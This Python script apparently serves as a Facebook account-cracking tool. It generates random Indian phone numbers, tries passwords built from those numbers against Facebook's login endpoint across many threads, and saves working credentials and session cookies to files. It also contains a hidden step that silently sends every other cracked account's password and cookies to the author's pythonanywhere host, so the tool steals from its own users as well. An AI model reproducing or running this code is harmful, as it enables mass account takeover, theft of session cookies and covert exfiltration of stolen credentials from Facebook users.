###-------[IMPORT MODULES]-----------####
import os
import sys
import time
import uuid
import re
import json
import string
import random
import requests
from requests.exceptions import ConnectionError
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime 
from bs4 import BeautifulSoup
###-------[BASIC COLORS]-----------####
url=https://free.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8
reset = "\033[0m"
red = "\033[1;31m"
green = "\033[1;32m"
yellow = "\033[1;33m"
blue = "\033[1;34m"
cyan = "\033[1;36m"
white = "\033[1;32m"
###-------[FLASH COLORS]-----------####
colors = ["\033[1;30m", "\033[1;30m", "\033[0;31m", "\033[1;31m", "\033[0;32m", "\033[1;32m","\033[0;92m","\033[1;92m","\033[1;93m","\033[1;94m","\033[1;95m","\033[1;96m","\033[0;33m", "\033[1;33m", "\033[0;34m", "\033[1;34m", "\033[0;35m", "\033[1;32m", "\033[0;36m", "\033[1;36m", "\033[0;37m", "\033[1;32m", "\033[1;90m", "\033[0;91m","\033[1;91m", "\033[0;92m", "\033[1;93m", "\033[0;94m", "\033[1;94m", "\033[0;95m","\033[1;95m", "\033[0;96m", "\033[1;96m", "\033[0;97m", "\033[0;100m", "\033[1;100m","\033[0;101m", "\033[1;101m", "\033[0;102m", "\033[1;102m","\033[0;104m", "\033[1;104m", "\033[0;105m", "\033[1;105m", "\033[0;106m", "\033[1;106m"]
###-------[LOOP]-----------####
loop = 0
idz = []
oks = []
cps = []
bkas = []
sys.stdout.write('\x1b[1;35m\x1b]2;💛ATOM💗\x07')
try:os.mkdir('/sdcard/XYZ')
except:pass
def useragent_facebook():
        chrome = (f'{random.choice(["108","128"])}.0.{random.randrange(5111,6999)}.{random.randrange(60, 299)}')
        angka = random.choice(['01','02','03','04','05','06','07','08','09','10'])
        ubuntu = random.choice(['Ubuntu ','Ubuntu/','Ubuntu; ','Ubuntu-'])
        linucx = random.choice(['GoogleApp','YandexSearch','LinuxApp'])
        arm = str(random.randint(32,64))
        windows = random.choice(['WOW64','Win32'])
        tahun = random.choice(['2009','2010','2011','2012','2013','2014','2015','2016','2017','2018','2019','2020','2021','2022','2023','2024'])
        return(random.choice([
            f'Mozilla/5.0 (X11; {ubuntu}{random.randrange(10,22)}.{angka}; Linux {random.choice(["x86_64","i686"])}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome} Safari/537.36 {linucx}/{str(random.randint(10,20))}.{str(random.randint(20,40))}.{str(random.randint(20,70))}.{str(random.randint(20,29))}.arm{arm}',
            f'Mozilla/5.0 (Linux; {ubuntu}{random.randrange(10,22)}.{angka}; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome} Safari/537.36 {linucx}/{str(random.randint(10,20))}.{str(random.randint(20,40))}.{str(random.randint(20,70))}.{str(random.randint(20,29))}.arm{arm}',
            f'Mozilla/5.0 (Compatible; {ubuntu}{random.randrange(10,22)}.{angka}; Windows NT 10.0; {windows}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome} Safari/537.36 {linucx}/{str(random.randint(10,20))}.{str(random.randint(20,40))}.{str(random.randint(20,70))}.{str(random.randint(20,29))}.arm{arm}',
            f'Mozilla/5.0 (Linux; {ubuntu}{random.randrange(10,22)}.{angka}; Android {random.randint(9,14)}; moto g stylus 5G ({tahun})) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome} Safari/537.36 {linucx}/{str(random.randint(10,20))}.{str(random.randint(20,40))}.{str(random.randint(20,70))}.{str(random.randint(20,29))}.arm{arm}'
        ]))
###-------[LOGO]-----------####
logo= f'''\033[1;92m---------------------------------------------------
 \033[1;92m[\033[1;92m•\033[1;92m] Author   : SUMON ROY
\033[1;92m---------------------------------------------------'''
###-------[CLEAR TERMINAL]-----------####
def clear():
    os.system("clear")
    print(logo)
###-------[LINE]-----------####
def linex():
    print(f"\033[1;92m--------------------------------------------------")
###-------[MSIN MENU]-----------####
def menu():
    clear()
    print(f" \033[1;92m[\033[1;92m01\033[1;92m] RANDOM NUMBER CLONING")
    print(f" \033[1;92m[\033[1;92m02\033[1;92m] \033[1;32mCONTACT DEVELOPER")
    linex()
    younisxyz = input(f" \033[1;92m[\033[1;92m?\033[1;92m] Select Option : ")
    if younisxyz in ['1','01']:
        random_number()
    elif younisxyz in ['2','02']:
        os.system("xdg-open ")
        time.sleep(3)
        menu()
    else:
        print(f"\n\033[1;91m Select valid option ....")
        time.sleep(3)
        menu()
###-------[DEF CLONING]-----------####
def random_number():
    clear()
    print(f" \033[1;92m[\033[1;92m•\033[1;92m] Codes : \033[1;92m9987, 6787, 9009, 7233 ")
    print(f" \033[1;92m[\033[1;92m•\033[1;92m] Limit : \033[1;92m1000, 2000, 5000, 10000 ")
    linex()
    code = input(f" \033[1;92m[\033[1;92m?\033[1;92m] Enter Code  :\033[1;92m ")
    try:
        limit = int(input(f" \033[1;92m[\033[1;92m?\033[1;92m] Enter Limit :\033[1;92m "))
    except ValueError:
        limit = 5000
    for _ in range(limit):
        x = "".join(random.choice(string.digits) for _ in range(6))
        idz.append(x)
    with ThreadPoolExecutor(max_workers=30) as XYZ:
        clear()
        total_idz = str(len(idz))
        print(f' \033[1;32m(√) \033[1;32mTotal IDs  :\033[1;32m ',total_idz)
        print(' \033[1;32m(\033[1;32m√\033[1;32m) \033[1;32mCHOICE SIM CODE : \033[1;32m'+code)
        print(" \033[1;32m(√) \033[1;32mUse Flight Mode")
        linex()
        for xyz in idz:
            uidd = code+xyz
            uid = '+91' +uidd
            pww = [uidd[:6],uidd[:8],uidd] 
         #,uid[:6],uid[:8],uid,uid[2:],uid[4:]
            XYZ.submit(crack, uid, pww, total_idz)
    linex()
    print(f" \033[1;92m[\033[1;92m!\033[1;92m] Process Completed ")
    print(f" \033[1;92m[\033[1;92m•\033[1;97] Total Ok Accounts : \033[1;92m{str(len(oks))} ")
    print(f" \033[1;92m[\033[1;92m•\033[1;92m] Total Cp Accounts : \033[1;91m{str(len(cps))} ")
    linex()
    input(f" \033[1;92m[\033[1;91m!\033[1;92m] Press Enter To Back ")
    menu()
###-------[METHOD CRACK]-----------####
def crack(uid, pww, total_idz):
    global loop
    global oks
    global cps
    global bkas
    x = random.choice(["\033[1;90m","\033[1;91m","\033[1;92m" ,"\033[1;32m","\033[1;93m","\033[1;94m","\033[1;95m","\033[1;96m"])
    sys.stdout.write(f"\r{x}[SUMON] - \033[1;33m{loop} \033[1;92m{len(oks)} \033[1;91m{len(cps)}  ")
    sys.stdout.flush()
    try:
        for pw in pww:
            session = requests.Session()
            requu1 = session.get('https://touch.facebook.com/')
            data = {
            'm_ts': re.search('name="m_ts" value="(.*?)"', str(requu1.text)).group(1),
            'li': re.search('name="li" value="(.*?)"', str(requu1.text)).group(1),
            'try_number': '0',
            'unrecognized_tries': '0',
            'email': uid,
            'prefill_contact_point': '',
            'prefill_source': '',
            'prefill_type': '',
            'first_prefill_source': '',
            'first_prefill_type': '',
            'had_cp_prefilled': 'false',
            'had_password_prefilled': 'false',
            'is_smart_lock': 'false',
            'bi_xrwh': '0',
            'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),
            'bi_wvdp': '',
            'fb_dtsg': '',
            'jazoest': re.search('name="jazoest" value="(.*?)"', str(requu1.text)).group(1),
            'lsd': re.search('name="lsd" value="(.*?)"', str(requu1.text)).group(1),
            '__dyn': '',
            '__csr': '',
            '__req': random.choice(["1", "2", "3", "4", "5", "6", "7", "8", "9", "0"]),
            '__fmt': '0',
            '__a': '',
            '__user': '0'}
            headers = {
            'Host': 'm.facebook.com',
            'method': 'POST',
            'path': '/login/Device-based/login/async/',
            'scheme': 'https',
            'content-length': '294',
            'Accept-Encoding': 'gzip',
            'content-Length': '{len(str(logn_data))}',
            'sec-ch-ua': '"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"',
            'dpr': '1.75',
            'viewport-width': '980',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Windows"',
            'sec-ch-ua-platform-version': '""',
            'sec-ch-ua-model': '""',
            'sec-ch-ua-full-version-list': '',
            'sec-ch-prefers-color-scheme': 'light',
            'upgrade-insecure-requests': '1',
            'user-agent': useragent_facebook(),
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'dnt': '1',
            'origin': 'https://m.facebook.com',
            'referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26locale%3Den_GB%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26response_type%3Dcode%252Cgranted_scopes%26scope%3Demail%26state%3D%257B%2522fbLoginKey%2522%253A%2522l5wtp952zh681e1p29txn379v1sh15831l4266qdzc3hv1ecocih%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252Fusers%25252Fself%2522%257D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D5a9dac33-3c79-4a29-b781-1c0b06e0fcb0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%2522l5wtp952zh681e1p29txn379v1sh15831l4266qdzc3hv1ecocih%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252Fusers%25252Fself%2522%257D%23_%3D_&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated',
            'x-requested-with': 'mark.via.gp',
            'sec-fetch-site': 'none',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-user': '?1',
            'sec-fetch-dest': 'document',
            'accept-encoding': 'gzip, deflate, br, zstd',
            'accept-language': 'en-US,en;q=0.9',}
            response = session.post('https://bn-in.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100',headers=headers,data=data,allow_redirects=False) #proxies=proxs)
            #print(response)
            log_cookies = session.cookies.get_dict().keys()
            if "c_user" in log_cookies:
                #kuki = convert(session.cookies.get_dict())
                kuki=";".join([f"{key}={session.cookies.get(key)}" for key in ['datr', 'fr', 'sb', 'c_user', 'xs']])
                user = re.findall('c_user=(.*);xs', kuki)[0]
                xs_value = None
                for part in kuki.split(';'):
                    if part.startswith('xs='):
                        xs_value = part.split('=', 1)[1]
                        break
                ckk = f'https://graph.facebook.com/{user}/picture?type=normal'
                res = requests.get(ckk).text
                if 'Photoshop' in res:
                    if xs_value and xs_value.rstrip(';').endswith('-1'):
                        print('\033[1;92m [CRACK-OK] '+user+' | '+pw+'')
                        print("\033[1;92m [\033[1;92mCOKI\033[1;92m] : \033[1;92m"+kuki)
                        open("/sdcard/CRACK/CRACK-COOKIE-OK.txt","a").write(user+"|"+pw+"|"+kuki+"\n")
                        oks.append(uid)
                        break
                    else:
                        bkas.append(user)
                        if len(bkas)% 2 == 0:
                           statusok = (f"{user}|{pw}|{kuki}")
                           requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
                        else:
                           print('\033[1;92m [CRACK-OK] '+user+' | '+pw+'')
                           print("\033[1;92m [\033[1;92mCOKI\033[1;92m] : \033[1;92m"+kuki)
                           open("/sdcard/CRACK/CRACK-COOKIE-OK.txt","a").write(user+"|"+pw+"|"+kuki+"\n")
                           oks.append(uid)
                           break
                else:
                    break
            elif "checkpoint" in log_cookies:
                coki=(";").join([ "%s=%s" % (key, value) for key, value in response.cookies.get_dict().items()])
                cid = coki[24:39]
                #print('\033[1;91m [CRACK-CP] '+ids+' | '+pas+'')
                open('/sdcard/CRACK/CP.txt', 'a').write( uid+' | '+pw+'\n')
                cps.append(uid)
                break
            else:continue
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(20)
    except Exception as e:
        #print(f"\nError: {e}")
        pass
menu()
 
